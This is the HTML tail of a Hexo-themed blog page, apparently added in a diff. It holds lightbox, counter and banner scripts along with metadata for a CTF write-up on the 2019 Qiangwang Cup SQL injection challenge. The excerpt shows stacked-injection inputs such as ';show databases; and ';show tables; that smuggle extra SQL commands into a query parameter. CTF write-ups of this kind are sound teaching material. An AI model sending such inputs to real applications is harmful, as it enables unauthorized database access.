+    window.firework && window.firework(JSON.parse('{"excludeElements":["a","button"],"particles":[{"shape":"circle","move":["emit"],"easing":"easeOutExpo","colors":["#ff5252","#ff7c7c","#ffafaf","#ffd0d0"],"number":20,"duration":[1200,1800],"shapeOptions":{"radius":[16,32],"alpha":[0.3,0.5]}},{"shape":"circle","move":["diffuse"],"easing":"easeOutExpo","colors":["#ff0000"],"number":1,"duration":[1200,1800],"shapeOptions":{"radius":20,"alpha":[0.2,0.5],"lineWidth":6}}]}'))
+  </script>
+
+
+
+
+
+
+
+
+
+
+<div id="lazy-script">
+  <div>
+    
+      
+      
+      <script data-pjax>
+        window.REIMU_POST = {
+          author: "fuboy",
+          title: "[强网杯 2019]随便注",
+          url: "http://example.com/2025/03/12/[%E5%BC%BA%E7%BD%91%E6%9D%AF%202019]%E9%9A%8F%E4%BE%BF%E6%B3%A8/",
+          excerpt: "",
+          description: "",
+          stripContent: " 判断闭合方式 看题目这是一个sql注入题  通过get传参来获取数据 那我们首先来判断注入类型 1234输入1-&amp;gt;正常回显输入1&amp;#x27;-&amp;gt;报错输入1“-&amp;gt;正常回显总结：这是一个字符型注入，且用单引号闭合  判断过滤信息 但当我们输入select时，它回显内容为：  告诉我们select已被过滤了，不能使用联合注入、报错注入  查找所能得到的信息 那我们还剩下一个堆叠注入 输入&#39;;show databases; 回显出了数据库信息  输入&#39;;show tables; 回显",
+          date: "Wed Mar 12 2025 19:39:25 GMT+0800",
+          updated: "Sun Mar 16 2025 20:00:56 GMT+0800",
+          cover: "/../images/17373827994914.jpg",
+        };
+      </script>
+       
+    
+    
+      
+        
+<script src="/js/insert_highlight.js" data-pjax></script>
+
+        
+      
+    
+    
+      <script type="module" data-pjax>
+        const PhotoSwipeLightbox = (await safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe-lightbox.esm.min.js", "sha384-DiL6M/gG+wmTxmCRZyD1zee6lIhawn5TGvED0FOh7fXcN9B0aZ9dexSF/N6lrZi/")).default;
+        
+        const pswp = () => {
+          if (_$$('.article-entry a.article-gallery-item').length > 0) {
+            new PhotoSwipeLightbox({
+              gallery: '.article-entry',
+              children: 'a.article-gallery-item',
+              pswpModule: () => safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.esm.min.js", "sha384-WkkO3GCmgkC3VQWpaV8DqhKJqpzpF9JoByxDmnV8+oTJ7m3DfYEWX1fu1scuS4+s")
+            }).init();
+          }
+          if(_$$('.article-gallery a.article-gallery-item').length > 0) {
+            new PhotoSwipeLightbox({
+              gallery: '.article-gallery',
+              children: 'a.article-gallery-item',
+              pswpModule: () => safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.esm.min.js", "sha384-WkkO3GCmgkC3VQWpaV8DqhKJqpzpF9JoByxDmnV8+oTJ7m3DfYEWX1fu1scuS4+s")
+            }).init();
+          }
+          window.lightboxStatus = 'done';
+          window.removeEventListener('lightbox:ready', pswp);
+        }
+        if(window.lightboxStatus === 'ready') {
+          pswp()
+        } else {
+          window.addEventListener('lightbox:ready', pswp);
+        }
+      </script>
+      
+
+
+
+
+
+
+
+
+    
+  </div>
+</div>
+
+
+  <script>
+    console.log(String.raw`%c 
+ ______     ______     __     __    __     __  __    
+/\  == \   /\  ___\   /\ \   /\ "-./  \   /\ \/\ \   
+\ \  __<   \ \  __\   \ \ \  \ \ \-./\ \  \ \ \_\ \  
+ \ \_\ \_\  \ \_____\  \ \_\  \ \_\ \ \_\  \ \_____\ 
+  \/_/ /_/   \/_____/   \/_/   \/_/  \/_/   \/_____/ 
+                                                  
+`,'color: #ff5252;')
+    console.log('%c Theme.Reimu v' + '1.3.0' + ' %c https://github.com/D-Sketon/hexo-theme-reimu ', 'color: white; background: #ff5252; padding:5px 0;', 'padding:4px;border:1px solid #ff5252;')
+  </script>
+  
+
+
+
+  
+<script src="https://npm.webcache.cn/busuanzi@2.3.0/bsz.pure.mini.js" integrity="sha384-0M75wtSkhjIInv4coYlaJU83+OypaRCIq2SukQVQX04eGTCBXJDuWAbJet56id+S" crossorigin="anonymous" async></script>
+
+
+
+
+<script>
+  if ('serviceWorker' in navigator) {
+    navigator.serviceWorker.getRegistrations().then((registrations) => {
+      for (let registration of registrations) {
+        registration.unregister();
+      }
+    });
+  }
+</script>
+
+
+
+
+
+
+
+  </body>
+  </html>
+
